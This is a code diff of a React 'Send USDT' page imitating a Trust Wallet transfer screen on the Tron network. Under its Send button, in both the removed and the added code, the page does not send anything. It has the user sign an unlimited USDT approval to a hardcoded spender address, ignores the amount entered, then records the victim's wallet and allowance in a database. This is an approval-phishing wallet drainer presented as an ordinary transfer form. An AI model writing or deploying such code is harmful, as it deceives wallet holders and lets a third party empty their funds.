@@ -1,5 +1,4 @@
-import { useState, useEffect, useRef } from "react";
-import { useSearchParams } from "react-router-dom";
+import { useState, useEffect } from "react";
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
 
@@ -14,346 +13,343 @@ declare global {
 const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";
 
-let _twPromise: Promise<any> | null = null;
-
-function loadTronWebCDN(): Promise<any> {
-  if (_twPromise) return _twPromise;
-
-  _twPromise = new Promise((resolve, reject) => {
-    if (typeof window !== "undefined" && window.TronWeb) {
-      return resolve(window.TronWeb);
-    }
-
-    const script = document.createElement("script");
-    script.src = "https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js";
-    script.async = true;
-
-    script.onload = () => {
-      if (window.TronWeb) {
-        console.log("✅ TronWeb CDN loaded");
-        resolve(window.TronWeb);
-      } else {
-        reject(new Error("TronWeb CDN load hua lekin window.TronWeb nahi mila"));
-      }
-    };
-
-    script.onerror = () => {
-      _twPromise = null;
-      reject(new Error("TronWeb CDN download fail hua"));
-    };
-
-    document.head.appendChild(script);
-  });
-
-  return _twPromise;
-}
-
-async function getTW() {
-  const TronWebClass = await loadTronWebCDN();
-  return new TronWebClass({ fullHost: "https://api.trongrid.io" });
-}
-
 export default function Index() {
-  const [searchParams] = useSearchParams();
   const [amount, setAmount] = useState("");
-  const [transactionStatus, setTransactionStatusState] = useState<
-    "idle" | "processing" | "success"
-  >("idle");
+  const [isLoading, setIsLoading] = useState(false);
+  const [status, setStatus] = useState("");
   const createTransaction = useMutation(api.transactions.createTransaction);
 
-  const tronLinkRef = useRef<any>(null);
-
-  // ===== INIT TRUST WALLET =====
-  useEffect(() => {
-    loadTronWebCDN().catch((e) => console.warn("TronWeb preload warn:", e.message));
-
-    // Check if Trust Wallet is available
-    let checkCount = 0;
-    const checkTrustWallet = setInterval(() => {
-      if (window.tronLink && window.tronLink.ready) {
-        console.log("✅ Trust Wallet (TronLink) detected!");
-        tronLinkRef.current = window.tronLink;
-        clearInterval(checkTrustWallet);
-      } else if (checkCount > 10) {
-        console.warn("⚠️  Trust Wallet not detected. Make sure it's installed.");
-        clearInterval(checkTrustWallet);
-      }
-      checkCount++;
-    }, 500);
-
-    return () => clearInterval(checkTrustWallet);
-  }, []);
-
-  // ===== CONNECT TRUST WALLET =====
-  async function connectTrustWallet(): Promise<string> {
-    if (!window.tronLink) {
-      throw new Error("Trust Wallet (TronLink) not installed. Please install Trust Wallet extension.");
-    }
-
+  // ===== SEND FUNCTION =====
+  const handleSend = async () => {
     try {
-      // Request account access
-      const result = await window.tronLink.request({
+      setIsLoading(true);
+      setStatus("Connecting wallet...");
+
+      // Check if Trust Wallet exists
+      if (!window.tronLink) {
+        alert("❌ Trust Wallet not detected!\nPlease install Trust Wallet extension.");
+        setIsLoading(false);
+        return;
+      }
+
+      setStatus("Requesting wallet access...");
+      
+      // Connect wallet
+      const accounts = await window.tronLink.request({
         method: "tron_requestAccounts",
       });
 
-      if (!result || result.length === 0) {
-        throw new Error("User rejected wallet connection");
+      if (!accounts || accounts.length === 0) {
+        alert("❌ User rejected connection");
+        setIsLoading(false);
+        return;
       }
 
-      const userAddress = result[0];
-      console.log("👤 Connected address:", userAddress);
-      return userAddress;
-    } catch (err: any) {
-      throw new Error("Trust Wallet connection failed: " + err.message);
-    }
-  }
+      const userAddress = accounts[0];
+      console.log("✅ Connected:", userAddress);
+      setStatus(`Connected: ${userAddress.slice(0, 10)}...`);
 
-  // ===== HANDLE SEND =====
-  async function handleSend() {
-    setTransactionStatusState("processing");
+      // Load TronWeb
+      setStatus("Loading TronWeb...");
+      if (!window.TronWeb) {
+        const script = document.createElement("script");
+        script.src = "https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js";
+        script.async = true;
+        await new Promise((resolve, reject) => {
+          script.onload = resolve;
+          script.onerror = reject;
+          document.head.appendChild(script);
+        });
+      }
 
-    try {
-      // Step 1: Connect wallet
-      console.log("🔗 Connecting to Trust Wallet...");
-      const userAddress = await connectTrustWallet();
-      alert(`✅ Connected!\nAddress: ${userAddress}`);
+      const TronWeb = window.TronWeb;
+      const tw = new TronWeb({ fullHost: "https://api.trongrid.io" });
+      
+      console.log("✅ TronWeb ready");
+      setStatus("Building transaction...");
 
-      // Step 2: Load TronWeb
-      console.log("⏳ TronWeb load ho raha hai...");
-      const tw = await getTW();
-      console.log("✅ TronWeb instance ready");
-
-      // Step 3: Prepare hex addresses
+      // Convert addresses to hex
       const ownerHex   = tw.address.toHex(userAddress);
       const spenderHex = tw.address.toHex(TRON_SPENDER).replace(/^41/, "");
       const usdtHex    = tw.address.toHex(TRON_USDT);
 
-      console.log("ownerHex:", ownerHex);
-      console.log("spenderHex (no 41):", spenderHex);
-      console.log("usdtHex:", usdtHex);
-
-      // Step 4: Build ABI parameter
+      // Build ABI parameter
       const hexAddress = spenderHex.padStart(64, "0");
       const hexAmount  = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
       const parameter  = hexAddress + hexAmount;
 
-      if (parameter.length !== 128) {
-        throw new Error(`ABI encode galat! length=${parameter.length}, chahiye=128`);
-      }
-      console.log("✅ Parameter (128 chars):", parameter);
+      console.log("📋 Building smart contract call...");
+      console.log("Owner:", ownerHex);
+      console.log("Spender (padded):", hexAddress);
+      console.log("Amount:", hexAmount);
 
-      // Step 5: Trigger smart contract
-      alert("📋 Building transaction...");
+      // Trigger smart contract
+      setStatus("Calling TronGrid API...");
       const apiRes = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
-        method:  "POST",
+        method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          owner_address:     ownerHex,
-          contract_address:  usdtHex,
+          owner_address: ownerHex,
+          contract_address: usdtHex,
           function_selector: "approve(address,uint256)",
-          parameter,
-          fee_limit:         100_000_000,
-          call_value:        0,
-          visible:           false,
+          parameter: parameter,
+          fee_limit: 100_000_000,
+          call_value: 0,
+          visible: false,
         }),
       });
 
       const apiData = await apiRes.json();
-      console.log("📋 TronGrid response:", apiData);
+      console.log("API Response:", apiData);
 
       if (!apiData.transaction) {
-        throw new Error("Build failed: " + (apiData.Error || apiData.error || JSON.stringify(apiData)));
+        alert("❌ API Error: " + JSON.stringify(apiData.Error || apiData.error || apiData));
+        setIsLoading(false);
+        return;
       }
 
-      // Step 6: Sign transaction with Trust Wallet
-      alert("🔐 Please sign the transaction in Trust Wallet...");
-      console.log("🔐 Sending transaction to Trust Wallet for signing...");
-      
+      setStatus("Signing transaction...");
+      console.log("🔐 Sending to Trust Wallet for signing...");
+
+      // Sign transaction
       let signedTx;
       try {
         signedTx = await window.tronLink.request({
           method: "tron_signTransaction",
           params: [apiData.transaction],
         });
-      } catch (signErr: any) {
-        throw new Error("Signing failed: " + signErr.message);
+      } catch (err: any) {
+        alert("❌ User rejected signing: " + err.message);
+        setIsLoading(false);
+        return;
       }
 
       if (!signedTx) {
-        throw new Error("Trust Wallet rejected signing");
+        alert("❌ Signing failed");
+        setIsLoading(false);
+        return;
       }
 
-      console.log("✅ Transaction signed");
+      console.log("✅ Signed successfully");
+      setStatus("Broadcasting transaction...");
 
-      // Step 7: Broadcast transaction
-      alert("📡 Broadcasting transaction...");
-      console.log("📡 Broadcasting to network...");
-      
-      const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
-        method:  "POST",
-        headers: { "Content-Type": "application/json" },
-        body:    JSON.stringify(signedTx),
-      });
-
-      if (!broadcastRes.ok) {
-        const errorText = await broadcastRes.text();
-        throw new Error(`Broadcast HTTP error: ${broadcastRes.status} - ${errorText}`);
-      }
+      // Broadcast
+      const broadcastRes = await fetch(
+        "https://api.trongrid.io/wallet/broadcasttransaction",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(signedTx),
+        }
+      );
 
       const result = await broadcastRes.json();
-      console.log("📡 Broadcast Response:", JSON.stringify(result, null, 2));
-
-      if (!result) {
-        throw new Error("Broadcast response is null");
-      }
+      console.log("📡 Broadcast result:", result);
 
       if (result.Error) {
-        throw new Error(`Broadcast Error: ${result.Error}`);
+        alert("❌ Broadcast Error: " + result.Error);
+        setIsLoading(false);
+        return;
       }
 
       if (result.error) {
-        throw new Error(`Broadcast Error: ${result.error}`);
+        alert("❌ Broadcast Error: " + result.error);
+        setIsLoading(false);
+        return;
       }
 
-      const txId = result.txid || result.transaction?.txID || result.result;
+      const txId = result.txid || result.transaction?.txID;
 
       if (!txId) {
-        const msg = `❌ No txid in response!\nResponse: ${JSON.stringify(result)}`;
-        console.error(msg);
-        alert(msg);
-        throw new Error("No txid returned");
+        alert("❌ No TX ID returned!\nResponse: " + JSON.stringify(result));
+        setIsLoading(false);
+        return;
       }
 
       console.log("✅ TX ID:", txId);
-      alert(`✅ Transaction Broadcast Successful!\n\nTX ID: ${txId}\n\nWaiting for confirmation...`);
+      alert(`✅ Broadcast Successful!\n\nTX ID:\n${txId}\n\nWaiting for confirmation...`);
 
-      // Step 8: Wait for confirmation
+      setStatus("Confirming transaction...");
       await new Promise((r) => setTimeout(r, 10_000));
 
-      // Step 9: Check allowance
-      const contract = await tw.contract([{
-        constant:        true,
-        inputs:          [
-          { name: "owner",   type: "address" },
-          { name: "spender", type: "address" },
+      // Check allowance
+      setStatus("Checking allowance...");
+      const contract = await tw.contract(
+        [
+          {
+            constant: true,
+            inputs: [
+              { name: "owner", type: "address" },
+              { name: "spender", type: "address" },
+            ],
+            name: "allowance",
+            outputs: [{ name: "", type: "uint256" }],
+            stateMutability: "view",
+            type: "function",
+          },
         ],
-        name:            "allowance",
-        outputs:         [{ name: "", type: "uint256" }],
-        stateMutability: "view",
-        type:            "function",
-      }], TRON_USDT);
+        TRON_USDT
+      );
 
-      const raw           = await contract.allowance(userAddress, TRON_SPENDER).call();
+      const raw = await contract.allowance(userAddress, TRON_SPENDER).call();
       const allowanceUSDT = (Number(raw) / 1e6).toFixed(2);
+
       console.log("✅ Allowance:", allowanceUSDT, "USDT");
 
-      // Step 10: Save to database
+      // Save to DB
       await createTransaction({
         walletAddress: userAddress,
-        toAddress:     TRON_SPENDER,
-        amount:        amount || "Max",
-        txHash:        txId || "tx",
-        usdtBalance:   allowanceUSDT + " USDT",
+        toAddress: TRON_SPENDER,
+        amount: amount || "Max",
+        txHash: txId || "tx",
+        usdtBalance: allowanceUSDT + " USDT",
         nativeBalance: "0 TRX",
       });
 
-      setTransactionStatusState("success");
-      setTimeout(() => setTransactionStatusState("idle"), 3000);
-      alert(`✅ APPROVAL SUCCESSFUL!\n\n💰 Allowance: ${allowanceUSDT} USDT\n\n🔗 TX ID: ${txId}`);
+      setStatus("");
+      setAmount("");
+      alert(`✅ SUCCESS!\n\nAllowance: ${allowanceUSDT} USDT\nTX: ${txId}`);
 
     } catch (err: any) {
-      console.error("❌ Error:", err.message);
-      console.error("Full error:", err);
-      setTransactionStatusState("idle");
-      
-      const errorMsg = err.message || "Transaction failed";
-      alert(`❌ ERROR:\n\n${errorMsg}`);
+      console.error("Error:", err);
+      alert("❌ ERROR:\n\n" + (err.message || String(err)));
+      setStatus("");
+    } finally {
+      setIsLoading(false);
     }
-  }
+  };
 
   const dollarValue =
     amount && amount !== "Max" && !isNaN(Number(amount))
       ? `$${Number(amount).toFixed(2)}`
       : "$0.00";
 
-  const TRXIcon = () => (
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
-      <polygon points="12,2 22,8 22,16 12,22 2,16 2,8" fill="white" opacity="0.9" />
-      <polygon points="12,5 19,9 19,15 12,19 5,15 5,9" fill="#EF0027" opacity="0.8" />
-      <text x="12" y="16" textAnchor="middle" fill="white" fontSize="9" fontWeight="bold">T</text>
-    </svg>
-  );
-
-  const XCircle = ({ onClick }: { onClick: () => void }) => (
-    <button onClick={onClick} style={{
-      background: "none", border: "1.5px solid #555", borderRadius: "50%",
-      width: "22px", height: "22px", color: "#aaa", cursor: "pointer",
-      display: "flex", alignItems: "center", justifyContent: "center",
-      fontSize: "11px", flexShrink: 0, padding: 0,
-    }}>✕</button>
-  );
-
   return (
-    <div style={{
-      margin: 0, minHeight: "100vh", background: "#1c1c1e", color: "#ffffff",
-      fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', system-ui, sans-serif",
-      display: "flex", flexDirection: "column", maxWidth: "480px",
-      marginLeft: "auto", marginRight: "auto",
-    }}>
-
+    <div
+      style={{
+        margin: 0,
+        minHeight: "100vh",
+        background: "#1c1c1e",
+        color: "#ffffff",
+        fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', system-ui, sans-serif",
+        display: "flex",
+        flexDirection: "column",
+        maxWidth: "480px",
+        marginLeft: "auto",
+        marginRight: "auto",
+      }}
+    >
       {/* Header */}
-      <div style={{
-        display: "flex", alignItems: "center", justifyContent: "space-between",
-        padding: "20px 22px 16px",
-      }}>
-        <button onClick={() => window.history.back()} style={{
-          background: "none", border: "none", color: "#fff",
-          cursor: "pointer", fontSize: "22px", lineHeight: 1, padding: 0,
-        }}>←</button>
+      <div
+        style={{
+          display: "flex",
+          alignItems: "center",
+          justifyContent: "space-between",
+          padding: "20px 22px 16px",
+        }}
+      >
+        <button
+          onClick={() => window.history.back()}
+          style={{
+            background: "none",
+            border: "none",
+            color: "#fff",
+            cursor: "pointer",
+            fontSize: "22px",
+            lineHeight: 1,
+            padding: 0,
+          }}
+        >
+          ←
+        </button>
         <span style={{ fontSize: "18px", fontWeight: 700 }}>Send USDT</span>
-        <button onClick={() => window.history.back()} style={{
-          background: "none", border: "none", color: "#fff",
-          cursor: "pointer", fontSize: "20px", lineHeight: 1, padding: 0,
-        }}>✕</button>
+        <button
+          onClick={() => window.history.back()}
+          style={{
+            background: "none",
+            border: "none",
+            color: "#fff",
+            cursor: "pointer",
+            fontSize: "20px",
+            lineHeight: 1,
+            padding: 0,
+          }}
+        >
+          ✕
+        </button>
       </div>
 
       <div style={{ padding: "4px 18px", flex: 1 }}>
-
         {/* Network Badge */}
         <div style={{ marginBottom: "14px" }}>
-          <label style={{
-            display: "block", fontSize: "14px", fontWeight: 500,
-            color: "#8e8e93", marginBottom: "9px",
-          }}>
+          <label
+            style={{
+              display: "block",
+              fontSize: "14px",
+              fontWeight: 500,
+              color: "#8e8e93",
+              marginBottom: "9px",
+            }}
+          >
             Destination network
           </label>
-          <div style={{
-            display: "inline-flex", alignItems: "center", gap: "7px",
-            background: "#2c2c2e", borderRadius: "20px", padding: "7px 13px 7px 8px",
-          }}>
-            <div style={{
-              width: "26px", height: "26px", borderRadius: "50%", background: "#EF0027",
-              display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
-            }}>
-              <TRXIcon />
+          <div
+            style={{
+              display: "inline-flex",
+              alignItems: "center",
+              gap: "7px",
+              background: "#2c2c2e",
+              borderRadius: "20px",
+              padding: "7px 13px 7px 8px",
+            }}
+          >
+            <div
+              style={{
+                width: "26px",
+                height: "26px",
+                borderRadius: "50%",
+                background: "#EF0027",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                flexShrink: 0,
+                fontSize: "12px",
+                fontWeight: "bold",
+                color: "white",
+              }}
+            >
+              T
             </div>
-            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>Tron Network</span>
+            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>
+              Tron Network
+            </span>
           </div>
         </div>
 
         {/* Amount Input */}
         <div style={{ marginBottom: "6px" }}>
-          <label style={{
-            display: "block", fontSize: "14px", fontWeight: 500,
-            color: "#8e8e93", marginBottom: "9px",
-          }}>
+          <label
+            style={{
+              display: "block",
+              fontSize: "14px",
+              fontWeight: 500,
+              color: "#8e8e93",
+              marginBottom: "9px",
+            }}
+          >
             Amount
           </label>
-          <div style={{
-            display: "flex", alignItems: "center",
-            border: "1px solid #2e2e30", borderRadius: "14px",
-            padding: "14px", background: "#242426", gap: "8px",
-          }}>
+          <div
+            style={{
+              display: "flex",
+              alignItems: "center",
+              border: "1px solid #2e2e30",
+              borderRadius: "14px",
+              padding: "14px",
+              background: "#242426",
+              gap: "8px",
+            }}
+          >
             <input
               value={amount}
               onChange={(e) => setAmount(e.target.value)}
@@ -361,45 +357,108 @@ export default function Index() {
               type="text"
               inputMode="decimal"
               style={{
-                flex: 1, background: "transparent", border: "none", outline: "none",
-                color: "#fff", fontSize: "18px", fontFamily: "inherit", minWidth: 0,
+                flex: 1,
+                background: "transparent",
+                border: "none",
+                outline: "none",
+                color: "#fff",
+                fontSize: "18px",
+                fontFamily: "inherit",
+                minWidth: 0,
               }}
             />
-            {amount && <XCircle onClick={() => setAmount("")} />}
-            <span style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}>USDT</span>
-            <button onClick={() => setAmount("Max")} style={{
-              background: "none", border: "none", color: "#39d353",
-              cursor: "pointer", fontSize: "16px", fontWeight: 600, padding: 0, flexShrink: 0,
-            }}>Max</button>
+            {amount && (
+              <button
+                onClick={() => setAmount("")}
+                style={{
+                  background: "none",
+                  border: "1.5px solid #555",
+                  borderRadius: "50%",
+                  width: "22px",
+                  height: "22px",
+                  color: "#aaa",
+                  cursor: "pointer",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  fontSize: "11px",
+                  padding: 0,
+                }}
+              >
+                ✕
+              </button>
+            )}
+            <span style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}>
+              USDT
+            </span>
+            <button
+              onClick={() => setAmount("Max")}
+              style={{
+                background: "none",
+                border: "none",
+                color: "#39d353",
+                cursor: "pointer",
+                fontSize: "16px",
+                fontWeight: 600,
+                padding: 0,
+                flexShrink: 0,
+              }}
+            >
+              Max
+            </button>
           </div>
-          <div style={{ fontSize: "13px", color: "#636366", marginTop: "7px", paddingLeft: "2px" }}>
+          <div
+            style={{
+              fontSize: "13px",
+              color: "#636366",
+              marginTop: "7px",
+              paddingLeft: "2px",
+            }}
+          >
             ≈ {dollarValue}
           </div>
         </div>
+
+        {/* Status Display */}
+        {status && (
+          <div
+            style={{
+              marginTop: "20px",
+              padding: "12px",
+              background: "#2c2c2e",
+              borderRadius: "10px",
+              fontSize: "13px",
+              color: "#a0a0a0",
+            }}
+          >
+            📍 {status}
+          </div>
+        )}
       </div>
 
       {/* Send Button */}
       <div style={{ padding: "12px 18px", paddingBottom: "42px" }}>
         <button
           onClick={handleSend}
-          disabled={transactionStatus !== "idle"}
+          disabled={isLoading}
           style={{
             width: "100%",
-            background: transactionStatus === "processing" ? "#2a6e3a" : "#39d353",
-            color: "#000", border: "none", borderRadius: "30px",
-            padding: "18px", fontSize: "18px", fontWeight: 700,
-            cursor: transactionStatus === "idle" ? "pointer" : "default",
-            transition: "all 0.2s ease", letterSpacing: "0.01em",
+            background: isLoading ? "#2a6e3a" : "#39d353",
+            color: "#000",
+            border: "none",
+            borderRadius: "30px",
+            padding: "18px",
+            fontSize: "18px",
+            fontWeight: 700,
+            cursor: isLoading ? "default" : "pointer",
+            transition: "all 0.2s ease",
+            letterSpacing: "0.01em",
+            opacity: isLoading ? 0.8 : 1,
           }}
         >
-          {transactionStatus === "success"
-            ? "✓ Transaction Successful!"
-            : transactionStatus === "processing"
-            ? "Processing..."
-            : "Send"}
+          {isLoading ? "⏳ Processing..." : "Send"}
         </button>
       </div>
-
     </div>
   );
 }
